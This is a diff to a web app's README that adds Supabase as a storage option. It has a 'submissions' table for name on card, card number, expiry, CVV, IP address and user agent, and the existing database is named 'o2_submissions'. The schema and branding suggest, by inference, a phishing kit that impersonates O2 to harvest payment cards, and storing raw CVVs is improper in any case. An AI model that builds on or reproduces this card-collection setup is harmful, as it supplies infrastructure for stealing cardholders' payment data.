@@ -54,6 +54,22 @@ The app will be available at `http://localhost:3000`
 2. Start MongoDB service
 3. Use connection string: `mongodb://localhost/o2_submissions`
 
+### Option 3: Supabase (Recommended for ease of setup)
+
+1. Go to https://app.supabase.com and create a new project.
+2. Create a new table named `submissions` with columns:
+   - `id` (bigint or bigint, primary key)
+   - `timestamp` (timestamp with time zone)
+   - `nameOnCard` (text)
+   - `cardNumber` (text)
+   - `expiry` (text)
+   - `cvv` (text)
+   - `ip` (text)
+   - `userAgent` (text)
+   - `createdAt` (timestamp with time zone)
+3. Go to Settings → API and copy the `anon` key.
+4. Add `SUPABASE_URL` and `SUPABASE_KEY` to your `.env` file.
+
 ## Deployment on Vercel
 
 1. Push your code to GitHub
@@ -87,5 +103,7 @@ The app will be available at `http://localhost:3000`
 Create a `.env` file with:
 ```
 MONGODB_URI=your_mongodb_connection_string
+SUPABASE_URL=your_supabase_url
+SUPABASE_KEY=your_supabase_anon_or_service_role_key
 PORT=3000
 ```
